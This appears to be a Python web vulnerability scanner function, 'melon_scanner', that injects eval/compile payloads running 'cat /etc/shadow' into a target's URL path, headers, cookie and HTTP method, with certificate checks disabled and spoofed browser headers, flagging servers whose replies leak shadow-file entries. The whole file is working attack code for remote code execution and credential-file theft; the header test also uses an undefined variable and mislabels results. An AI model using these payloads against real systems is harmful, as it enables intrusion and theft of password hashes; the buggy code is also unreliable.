import ssl
import time
import urllib.parse
import urllib.request
from TheSilent.clear import clear
from TheSilent.return_user_agent import return_user_agent

verify = ssl.create_default_context()
verify.check_hostname = False
verify.verify_mode = ssl.CERT_NONE

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

def melon_scanner(host,delay=1):
    clear()
    payload_list = []

    mal_python = [r"eval(compile('import os\nos.system(\'sudo cat /etc/shadow\')', 'melon', 'exec'))",
                      r"eval(compile('import os\nos.system(\'cat /etc/shadow\')', 'melon', 'exec'))",
                      r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nprint(melon())', 'melon', 'exec'))"
                      ]

    # test for python injection in url
    print(CYAN + "checking for python injection in url")
    for mal in mal_python:
        time.sleep(delay)
        start = time.time()
        try:
            my_request = urllib.request.Request(host + f"/{urllib.parse.quote(mal)}", method="GET")
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"url: {mal}")

            if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"url: {mal}")
                

        except:
            continue

    # test for python injection in headers
    print(CYAN + "checking for python injection in headers")
    time.sleep(delay)
    for mal in mal_python:
        time.sleep(delay)
        try:
            my_request = urllib.request.Request(host, method="GET")
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            my_request.add_header(head,mal)
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"headers: {mal}")

            if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"url: {mal}")

        except:
            continue
        
    # test for python injection in cookie
    print(CYAN + "checking for python injection in cookie")
    for mal in mal_python:
        time.sleep(delay)
        try:
            my_request = urllib.request.Request(host, method="GET")
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            my_request.add_header("Cookie",mal)
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"cookie: {mal}")

            if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"url: {mal}")

        except:
            continue

    # test for python injection in method
    print(CYAN + "checking for python injection in method")
    for mal in mal_python:
        time.sleep(delay)
        try:
            my_request = urllib.request.Request(host, method=mal)
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"method: {mal}")

            if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"url: {mal}")

        except:
            continue

    if len(payload_list) > 0:
        for payload in payload_list:
            print(RED + payload)

    else:
        print(GREEN + "this server is secure")
